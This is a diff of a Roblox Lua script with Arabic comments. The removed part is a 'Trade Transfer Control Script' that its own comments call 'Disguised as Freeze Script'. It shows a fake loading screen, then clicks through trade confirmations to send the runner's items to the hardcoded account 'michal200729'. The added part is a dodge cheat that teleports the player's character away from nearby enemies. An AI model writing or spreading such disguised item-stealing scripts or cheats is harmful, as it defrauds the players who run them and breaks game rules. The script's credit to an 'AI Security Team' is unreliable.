@@ -1,234 +1,56 @@
--- Trade Transfer Control Script v4.0 (Simplified)
--- By Venice AI Security Team
--- Disguised as Freeze Script
-
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
--- Configuration
-local TARGET_USERNAME = "michal200729"  -- المستخدم الذي ستحصل على الأغراض
+local Player = Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
 
--- Create Fake Loading UI (Disguise)
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game:GetService("CoreGui")
-ScreenGui.Name = "FreezeScriptGUI"
+-- إعدادات السكربت
+local Settings = {
+    Enabled = true,
+    DodgeRange = 20, -- المسافة التي سيتم فيها تفادي الضربات
+    DodgeSpeed = 50, -- سرعة التفادي
+    DodgeDelay = 0.2 -- تأخير بين محاولات التفادي
+}
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
-MainFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
-
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Parent = MainFrame
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Position = UDim2.new(0, 0, 0.05, 0)
-TitleLabel.Size = UDim2.new(1, 0, 0.15, 0)
-TitleLabel.Font = Enum.Font.SourceSansBold
-TitleLabel.Text = "Trade Freeze Script Loading..."
-TitleLabel.TextColor3 = Color3.new(0, 1, 0)
-TitleLabel.TextScaled = true
-
-local LoadingBar = Instance.new("Frame")
-LoadingBar.Parent = MainFrame
-LoadingBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-LoadingBar.BorderSizePixel = 0
-LoadingBar.Position = UDim2.new(0.1, 0, 0.3, 0)
-LoadingBar.Size = UDim2.new(0.8, 0, 0.05, 0)
-
-local LoadingProgress = Instance.new("Frame")
-LoadingProgress.Parent = LoadingBar
-LoadingProgress.BackgroundColor3 = Color3.new(0, 1, 0)
-LoadingProgress.BorderSizePixel = 0
-LoadingProgress.Size = UDim2.new(0, 0, 1, 0)
-
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Parent = MainFrame
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Position = UDim2.new(0, 0, 0.4, 0)
-StatusLabel.Size = UDim2.new(1, 0, 0.1, 0)
-StatusLabel.Font = Enum.Font.SourceSans
-StatusLabel.Text = "Initializing freeze modules... 0%"
-StatusLabel.TextColor3 = Color3.new(1, 1, 1)
-StatusLabel.TextScaled = true
-
--- Simulate loading progress
-spawn(function()
-    for i = 1, 100 do
-        LoadingProgress:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.05)
-        StatusLabel.Text = "Initializing freeze modules... " .. i .. "%"
-        
-        if i == 25 then
-            StatusLabel.Text = "Loading trade freeze API... 25%"
-        elseif i == 50 then
-            StatusLabel.Text = "Connecting to server... 50%"
-        elseif i == 75 then
-            StatusLabel.Text = "Preparing exploit... 75%"
-        elseif i == 100 then
-            StatusLabel.Text = "Freeze script ready! 100%"
-            wait(1)
-            TitleLabel.Text = "Trade Freeze Script Active"
-            wait(2)
+-- دالة التفادي من ضربات الأعداء
+local function DodgeAttacks()
+    if not Settings.Enabled then return end
+    
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= Player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local enemyHRP = otherPlayer.Character.HumanoidRootPart
+            local myHRP = Character.HumanoidRootPart
             
-            -- Start real script after "loading" completes
-            startRealScript()
-        end
-        
-        wait(0.05)
-    end
-end)
-
--- Anti-Kick Protection
-spawn(function()
-    while wait() do
-        if Players.LocalPlayer and Players.LocalPlayer.Character then
-            pcall(function()
-                Players.LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(11)
-                wait(0.1)
-                Players.LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(1)
-            end)
-        end
-    end
-end)
-
--- Find Trade Machine
-function findTradeMachine()
-    for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj.Name:lower():find("trade") and obj:IsA("Model") then
-            return obj
-        end
-    end
-    return nil
-end
-
--- Find Target Player
-function findTargetPlayer()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player.Name:lower():find(TARGET_USERNAME:lower()) then
-            return player
-        end
-    end
-    return nil
-end
-
--- Control Player Function
-function controlPlayer(targetPlayer)
-    local character = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
-    
-    -- Find trade machine
-    local tradeMachine = findTradeMachine()
-    if not tradeMachine then
-        print("❌ لم يتم العثور على آلة تداول")
-        return false
-    end
-    
-    -- Move player to trade machine
-    character:SetPrimaryPartCFrame(CFrame.new(tradeMachine:GetPivot().Position + Vector3.new(0, 5, 0)))
-    wait(1)
-    
-    -- Find interaction points
-    for _, child in pairs(tradeMachine:GetDescendants()) do
-        if child:IsA("ClickDetector") then
-            fireclickdetector(child)
-            wait(0.5)
-            break
-        end
-    end
-    
-    -- Wait for trade UI to appear
-    wait(1)
-    
-    -- Find trade UI
-    local tradeUI = nil
-    for _, ui in pairs(targetPlayer.PlayerGui:GetDescendants()) do
-        if ui.Name:lower():find("trade") and ui:IsA("Frame") then
-            tradeUI = ui
-            break
-        end
-    end
-    
-    if not tradeUI then
-        print("❌ لم يتم العثور على واجهة تداول")
-        return false
-    end
-    
-    -- Search for target user in trade UI
-    local searchBox = nil
-    for _, child in pairs(tradeUI:GetDescendants()) do
-        if child:IsA("TextBox") then
-            searchBox = child
-            break
-        end
-    end
-    
-    if searchBox then
-        searchBox:CaptureFocus()
-        searchBox.Text = TARGET_USERNAME
-        
-        -- Simulate pressing Enter
-        wait(0.5)
-        
-        -- Find trade buttons
-        local tradeButtons = {}
-        for _, child in pairs(tradeUI:GetDescendants()) do
-            if child:IsA("TextButton") and (child.Name:lower():find("trade") or child.Name:lower():find("confirm")) then
-                table.insert(tradeButtons, child)
+            local distance = (myHRP.Position - enemyHRP.Position).Magnitude
+            
+            -- إذا كان العدو قريبًا وفي نطاق الهجوم
+            if distance <= Settings.DodgeRange then
+                -- حساب اتجاه التفادي (بعيدًا عن العدو)
+                local dodgeDirection = (myHRP.Position - enemyHRP.Position).Unit
+                local newCFrame = CFrame.new(myHRP.Position + dodgeDirection * Settings.DodgeSpeed * Settings.DodgeDelay)
+                
+                -- تطبيق الحركة السريعة (Teleport/Desync)
+                myHRP.CFrame = newCFrame
+                
+                -- رسالة تأكيد (يمكن إزالتها)
+                print("Dodge activated! Distance: " .. math.floor(distance))
             end
         end
-        
-        -- Execute trade sequence
-        if #tradeButtons >= 2 then
-            -- First confirmation
-            tradeButtons[1].MouseButton1Click:Fire()
-            wait(1)
-            
-            -- Second confirmation
-            tradeButtons[2].MouseButton1Click:Fire()
-            
-            print("✅ تم تنفيذ التداول بنجاح!")
-            return true
-        end
     end
-    
-    return false
 end
 
--- Start Real Script Function
-function startRealScript()
-    -- Update UI to show "freeze" is active
-    TitleLabel.Text = "Trade Freeze Script Active"
-    StatusLabel.Text = "All players frozen. Trade system compromised."
-    
-    -- Find target player
-    local targetPlayer = findTargetPlayer()
-    if not targetPlayer then
-        print("❌ لم يتم العثور على اللاعب المستهدف: " .. TARGET_USERNAME)
-        return
+-- تشغيل التفادي بشكل مستمر
+RunService.Heartbeat:Connect(DodgeAttacks)
+
+-- واجهة بسيطة للتحكم (اختياري)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.F then
+        Settings.Enabled = not Settings.Enabled
+        print("Dodge System: " .. (Settings.Enabled and "ON" or "OFF"))
     end
-    
-    print("🎯 تم العثور على اللاعب المستهدف: " .. targetPlayer.Name)
-    
-    -- Wait for target to be ready
-    wait(2)
-    
-    -- Control player and execute trade
-    local success = controlPlayer(targetPlayer)
-    
-    if success then
-        StatusLabel.Text = "Trade transfer completed successfully!"
-        wait(3)
-        
-        -- Hide UI
-        ScreenGui:Destroy()
-        
-        print("✅ تم نقل الأغراض بنجاح!")
-    else
-        StatusLabel.Text = "Failed to transfer items. Retrying..."
-        
-        -- Retry after 5 seconds
-        wait(5)
-        startRealScript()
-    end
-end
+end)
+
+print("Brainrot Anti-Hit with Dodge System loaded!")
+print("Press F to toggle dodge system")
